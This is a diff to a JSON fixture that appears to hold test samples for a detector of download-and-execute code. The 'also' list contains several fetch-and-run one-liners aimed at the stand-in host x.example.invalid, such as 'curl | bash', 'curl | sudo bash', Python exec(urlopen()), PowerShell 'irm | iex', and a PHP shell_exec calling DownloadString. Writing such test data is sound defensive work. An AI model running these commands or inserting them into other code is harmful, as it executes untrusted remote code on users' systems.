@@ -128,7 +128,8 @@
       "execSync('curl -s https://x.example.invalid/sums.txt | sha256sum -c');",
       "const text = await (await fetch(url)).text();\nconst value = JSON.parse(text);",
       "execSync('certutil -hashfile setup.exe SHA256');",
-      "const result = evaluate(await fetch(url));"
+      "const result = evaluate(await fetch(url));",
+      "const POWERSHELL_ALIASES = 'h history icm iex ihy ii ipal ipcsv ipmo irm ise iwmi iwr kill lp';"
     ],
     "also": [
       ["py", "exec(urlopen('https://x.example.invalid/s.py').read())"],
@@ -147,7 +148,12 @@
         "Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", \"curl -s https://x.example.invalid/a | bash\"});"
       ],
       ["sh", "curl -s https://x.example.invalid/i.sh | sudo -E bash -"],
-      ["sh", "bash -c \"$(curl -fsSL https://x.example.invalid/i.sh)\""]
+      ["sh", "bash -c \"$(curl -fsSL https://x.example.invalid/i.sh)\""],
+      ["sh", "pwsh -c \"irm https://x.example.invalid/a.ps1 | iex\""],
+      [
+        "php",
+        "shell_exec('powershell -c \"iex $wc.DownloadString(\\'https://x.example.invalid/a\\')\"');"
+      ]
     ]
   }
 }
